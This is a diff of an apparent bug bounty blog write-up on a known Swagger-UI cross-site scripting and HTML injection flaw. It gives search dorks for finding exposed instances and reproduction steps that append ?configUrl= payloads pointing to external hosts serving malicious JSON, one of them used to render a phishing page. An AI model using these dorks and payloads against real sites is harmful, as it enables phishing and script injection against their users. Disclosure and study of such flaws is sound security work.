@@ -1,5 +1,5 @@
 ---
-title: "My first Valid bug :Unveiling Cross-Site Scripting in Swagger-ui"
+title: "My first Valid Finding | Unveiling Cross-Site Scripting in Swagger-ui"
 date: 2023-10-30
 draft: false
 series: "Bug Hunting"
@@ -12,20 +12,22 @@ tags: ["bug bounty hunting", "write-up"]
 
 peace be upan you ! : 💐
 
-Welcome to my first write-up 📝, where I share the exciting tale of my discovery and reporting of a simple yet impactful XSS bug in Swagger-ui.
+Welcome to my first write-up 📝, where I share the exciting tale of my discovery and reporting of Swagger-UI vuln app and how i was able to exploit it!
 
 so, lets go on and start with a short intro about the vulnerablity!
 
 ## Swagger-UI’s XSS :
 
 Swagger-UI, a popular tool for designing, building, and documenting APIs, provides a user-friendly interface for developers to explore and interact with API endpoints. However, like any web application, Swagger-UI is not immune to security vulnerabilities.
-and The root cause is that Swagger-UI allows users to provide a URL for an API specification, such as a YAML or JSON file in outdated version of DomPurify, an XML sanitizer library for HTML, MathML, and SVG. . To view and render them, you add a query parameter. It would be possible to trigger an XSS attack by loading a malicious!!
+and The root cause is that Swagger-UI allows users to provide a URL for an API specification, such as a YAML or JSON file in outdated version of DomPurify, an XML sanitizer library for HTML, MathML, and SVG.To view and render them, you add a query parameter. It would be possible to trigger an XSS and html injection by loading a malicious!!
 
 - for more about this vuln, please check the References !
 
 ### The Story Unfolds: The Journey Begins ✨ !!
 
 so During my 🔎 of the Swagger-ui application, that I found via shodan by using specific Dorks! Here are a few dorks that you can use to search in Shodan for Swagger-UI:
+
+- Remediation : Swagger UI versions affected with the XSS: >=3.14.1 < 3.38.0
 
 ```
 "Swagger-UI"
@@ -46,7 +48,9 @@ intext:"Powered by Swagger UI"
 site:github.com inurl:swagger-ui
 ```
 
-so ! I stumbled upon a potential XSS vulnerability. By appending a specific payloads to the Swagger UI URL, I was able to inject and execute arbitrary JavaScript code. The steps to reproduce the bug were as follows:
+so ! I stumbled upon a potential XSS vulnerability. By appending a specific payloads to the Swagger UI URL, I was able to inject it! then after Searching more I found an payload for rendering an phishing page as json file!
+
+. The steps to reproduce the bug were as follows:
 
 - Visit the Swagger UI URL:
 
@@ -54,7 +58,7 @@ so ! I stumbled upon a potential XSS vulnerability. By appending a specific payl
  https://127.0.0.1/swagger/index.html.
 ```
 
-- Append the following payload to the URL _ I used this payload as shown below _:
+- Append the following payload to the URL _ I used payload for rendering phishing page : as shown below _:
 
 ```
 ?configUrl=https://tearful-earth.surge.sh/test.json.
@@ -68,21 +72,16 @@ so ! I stumbled upon a potential XSS vulnerability. By appending a specific payl
 
 ![image tooltip here](https://github.com/khawla-abdulsattar/poison/blob/main/static/images/dhey.PNG?raw=true)
 
-## Impact of Cross-Site Scripting:
+- note : you can also append this payload to the end of the Swagger UI URL! u will see an alert dialog
 
-Cross-site scripting attacks can have severe consequences and enable attackers to achieve various malicious goals. Some of the potential impacts include:
+```
+?configUrl=https://xss.smarpo.com/test.json
 
-- Cookie Theft: Attackers can exploit XSS vulnerabilities to steal users' cookies, which may contain sensitive information such as session tokens or login credentials. With this information, the attacker can impersonate the victim and gain unauthorized access to their accounts.
-
-- Local Storage Access: XSS can be used to access and extract data stored in the victim's local storage. This could include personal information, sensitive documents, or any other data stored by the web application.
-
-- Keyloggers: Attackers can leverage XSS to inject keylogging scripts, enabling them to capture keystrokes made by users. This can lead to the theft of sensitive information, such as passwords or credit card details.
-
-- Phishing Attacks: XSS vulnerabilities can be exploited to display convincing phishing forms or pop-ups to users, tricking them into revealing their credentials or other sensitive information.
+```
 
 ---
 
-As I conclude this article, I hope that my journey of uncovering an XSS bug has ignited a spark within you ⚡: .
+As I conclude this article, I hope that my journey has ignited a spark within you ⚡: .
 Whether you're a security professional or just starting your exploration of the web security realm, remember that every bug, no matter how small or seemingly insignificant, has the potential to make a significant impact.
 
 ###### thanks fot reading 💜👾
